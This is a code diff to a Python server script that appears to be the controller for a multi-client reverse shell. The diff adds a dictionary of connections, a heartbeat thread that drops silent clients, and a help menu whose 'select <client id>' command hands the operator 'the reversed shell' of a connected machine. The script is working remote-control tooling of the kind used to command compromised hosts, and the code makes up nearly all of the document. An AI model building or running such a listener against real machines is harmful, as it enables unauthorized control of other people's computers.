@@ -3,19 +3,26 @@ import sys
 import threading
 import time
 from queue import Queue
-import os
-
+from collections import defaultdict
 NUMBER_OF_THREADS = 3
 JOB_NUMBER = [1, 2, 3]
 queue = Queue()
-all_connections = []
-all_address = []
-hb_connections = []
-hb_address = []
+all_connections = {}
+hb_connections = {}
 
 port = int(sys.argv[1])
-
+hb_rate = 1
+max_failure = 5
 # Create a Socket ( connect two computers)
+
+help_info = ' ----------------------------------------------------------------\n' \
+            '|Help info: use below commands to find clients or control        |\n' \
+            '|list: display connected client and address                      |\n' \
+            '|select <client id>: select client and return the reversed shell |\n' \
+            '|heartbeat: display the client side heart beat daemon            |\n' \
+            '|exit: log out remote client shell                               |\n' \
+            ' ----------------------------------------------------------------\n'
+
 def create_socket():
     try:
         global host
@@ -24,7 +31,6 @@ def create_socket():
         host = ""
         port = port if port else 8091
         s = socket.socket()
-
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
@@ -48,20 +54,17 @@ def bind_socket():
 # Handling connection from multiple clients and saving to a list
 # Closing previous connections when server.py file is restarted
 
+def clear_all():
+    for i, (_, _) in all_connections.items():
+        clear_connection(i)
+
+    for i, (_, _) in hb_connections.items():
+        clear_connection(i)
+
+
 def accepting_connections():
     # close shell connections
-    for c in all_connections:
-        c.close()
-
-    del all_connections[:]
-    del all_address[:]
-
-    # close heartbeat connections
-    for c in hb_connections:
-        c.close()
-
-    del hb_connections[:]
-    del hb_address[:]
+    clear_all()
 
     while True:
         try:
@@ -69,31 +72,22 @@ def accepting_connections():
             s.setblocking(1)  # prevents timeout
         except:
             print("Error accepting connections")
+
+        data = None
         try:
             data = conn.recv(1024)
         except:
             print("error in receiving data")
-
+        # empty for shell process, else for hb
         if data == b' ':
-            all_connections.append(conn)
-            all_address.append(address)
-            print("Connection has been established :" + address[0])
+            new_client = max(all_connections) + 1 if all_connections else 0
+            all_connections[new_client] = (conn, address)
+            print("Connection has been established :" + address[0], address[1], flush=True)
+            print(help_info)
+
         else:
-            print("create hb process", data)
-            hb_connections.append(conn)
-            hb_address.append(address)
-
-
-
-
-# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
-# Interactive prompt for sending commands
-# turtle> list
-# 0 Friend-A Port
-# 1 Friend-B Port
-# 2 Friend-C Port
-# turtle> select 1
-# 192.168.0.112> dir
+            new_client = max(hb_connections) + 1 if hb_connections else 0
+            hb_connections[new_client] = (conn, address)
 
 
 def start_turtle():
@@ -106,59 +100,67 @@ def start_turtle():
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
-        elif 'hb' in cmd:
-            print(hb_connections)
-            #show_client_daemon()
+        elif 'heartbeat' in cmd:
+            show_client_daemon()
+        elif cmd =='':
+            continue
         else:
             print("Command not recognized")
 
+
 def show_client_daemon():
-    for i, conn in enumerate(hb_connections):
-        print("client " + str(i) + '')
+    for i, (conn, address) in hb_connections.items():
+        results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
+        print("----Clients----" + "\n" + results)
 
 
 def hb_test():
-    #time.sleep()
+    hb_failures = defaultdict(int)
     while True:
-        for i, conn in enumerate(hb_connections):
+        time.sleep(hb_rate)
+        hb_keys = list(hb_connections.keys())
+        for i in hb_keys:
             try:
-                conn.send(str.encode(' '))
-                #conn.recv(20480)
+                hb_connections[i][0].send(str.encode(' '))
             except:
-                print("client " + str(i) + 'lost connection')
-                del all_connections[i]
-                del hb_connections[i]
-                del all_address[i]
-                del hb_address[i]
-                continue
+                hb_failures[i] += 1
+            if hb_failures[i] > max_failure:
+                msg = "client {} no response for {}s "
+                print(msg.format(i, hb_failures[i] * hb_rate ))
+                print("disconnect client", i, end='\n')
+                clear_connection(i)
+                hb_failures[i] = 0
+
 
 # Display all current active connections with client
+def clear_connection(i):
+    all_connections[i][0].close()
+    del all_connections[i]
+    hb_connections[i][0].close()
+    del hb_connections[i]
 
 def list_connections():
-    results = ''
-
-    for i, conn in enumerate(all_connections):
+    to_remove = []
+    for i, (conn, address) in all_connections.items():
         try:
             conn.send(str.encode(' '))
             conn.recv(20480)
         except:
-            del all_connections[i]
-            del all_address[i]
+            to_remove.append(i)
             continue
-
-        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
-
+        results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
         print("----Clients----" + "\n" + results)
-
+    for i in to_remove:
+        clear_connection(i)
 
 # Selecting the target
 def get_target(cmd):
     try:
         target = cmd.replace('select ', '')  # target = id
         target = int(target)
-        conn = all_connections[target]
-        print("You are now connected to :" + str(all_address[target][0]))
-        print(str(all_address[target][0]) + ">", end="")
+        conn, address = all_connections[target]
+        print("You are now connected to :" + str(address[0]))
+        print(str(address[0]) + ">", end="")
         return conn
         # 192.168.0.4> dir
 
